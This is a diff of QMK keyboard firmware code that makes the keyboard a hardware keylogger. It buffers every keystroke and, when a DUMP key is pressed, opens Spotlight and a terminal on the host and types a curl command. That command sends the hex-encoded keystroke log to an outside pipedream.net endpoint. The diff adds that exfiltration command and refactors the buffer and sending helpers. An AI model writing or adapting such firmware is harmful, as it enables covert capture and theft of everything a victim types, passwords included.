@@ -1,120 +1,19 @@
 #include QMK_KEYBOARD_H
 
 #include "key_event.h"
-#include "const_strings.h"
+#include "ring_buf.h"
+#include "custom_control.h"
+#include "keycode_convert.h"
 
-#define NO_KEY_MAPPING          0
+const char QUERY_CMD_START[] PROGMEM = "curl 'enimozqxebt4wf5.m.pipedream.net?q=";
+const char QUERY_CMD_END[] PROGMEM = "'; exit";
+
+ring_buf keylog = { .head = 0, .length = 0 };
 
 enum custom_keycodes {
     DUMP = SAFE_RANGE,
     REM_DUMP
 };
-
-#define BUF_LEN 2048
-typedef struct {
-    struct key_event events[BUF_LEN];
-    uint16_t head;
-    uint16_t length;
-} ring_buf;
-
-ring_buf keylog = { .head = 0, .length = 0 };
-
-static void rb_push_back(ring_buf *rb, struct key_event event) {
-    if (rb->length < BUF_LEN) {
-        uint16_t slot = (rb->head + rb->length) % BUF_LEN;
-        rb->events[slot] = event;
-        rb->length++;
-    } else {
-        rb->events[rb->head] = event;
-        rb->head = (rb->head + 1) % BUF_LEN;
-    }
-
-}
-
-#if 0
-static struct key_event rb_pop_front(ring_buf *rb) {
-    if (rb->length <= 0) {
-        return NO_EVENT;
-    }
-
-    struct key_event event = rb->events[rb->head];
-
-    if (rb->head == BUF_LEN - 1) {
-        q->head = 0;
-    } else {
-        q->head++;
-    }
-
-    q->length--;
-
-    return event;
-}
-#endif
-
-static struct key_event rb_peek_at(ring_buf *rb, uint16_t index) {
-    if (index < 0 || index >= rb->length) {
-        return NO_EVENT;
-    }
-
-    uint16_t rb_idx = (rb->head + index) % BUF_LEN;
-
-    return rb->events[rb_idx];
-}
-
-#define MOD_OFFSET (KC_LCTRL - (KC_KP_EQUAL + 1))
-static uint8_t map_qmk_kc(uint16_t qmk_kc) {
-    if (qmk_kc >= KC_A && qmk_kc <= KC_KP_EQUAL) {
-        return (uint8_t)qmk_kc;
-    } else if (qmk_kc >= KC_LCTRL && qmk_kc <= KC_RGUI) {
-        return (uint8_t)(qmk_kc - MOD_OFFSET);
-    }
-
-    return NO_KEY_MAPPING;
-}
-
-static uint16_t get_qmk_kc(uint8_t mapped_kc) {
-    if (mapped_kc >= KC_A && mapped_kc <= KC_KP_EQUAL) {
-        return (uint16_t)mapped_kc;
-    } else if (mapped_kc + MOD_OFFSET <= KC_RGUI) {
-        return (uint16_t)(mapped_kc + MOD_OFFSET);
-    }
-
-    return NO_KEY_MAPPING;
-}
-
-
-
-
-static void send_byte_as_hex(uint8_t byte) {
-    static const char HEX[16] = "0123456789ABCDEF";
-
-    char hi = HEX[(byte >> 4) & 0xF];
-    char lo = HEX[byte & 0xF];
-
-    send_char(hi);
-    send_char(lo);
-}
-
-static void open_spotlight(void) {
-    register_code(KC_LGUI);
-    register_code(KC_SPACE);
-    unregister_code(KC_SPACE);
-    unregister_code(KC_LGUI);
-}
-
-static void open_terminal(void) {
-    send_string_P(TERMINAL);
-    tap_code(KC_ENT);
-}
-
-static void send_logged_data(void) {
-    for (uint16_t i = 0; i < keylog.length; i++) {
-        struct key_event event = rb_peek_at(&keylog, i);
-        uint8_t byte = EVENT_TO_BYTE(event);
-        send_byte_as_hex(byte);
-    }
-}
-
 
 bool process_record_user(uint16_t keycode, keyrecord_t *record) {
     uint8_t mapped_kc = map_qmk_kc(keycode);
@@ -154,7 +53,7 @@ bool process_record_user(uint16_t keycode, keyrecord_t *record) {
 
             send_string_P(QUERY_CMD_START);
 
-            send_logged_data();
+            send_logged_data(&keylog);
 
             send_string_P(QUERY_CMD_END);
             tap_code(KC_ENT);
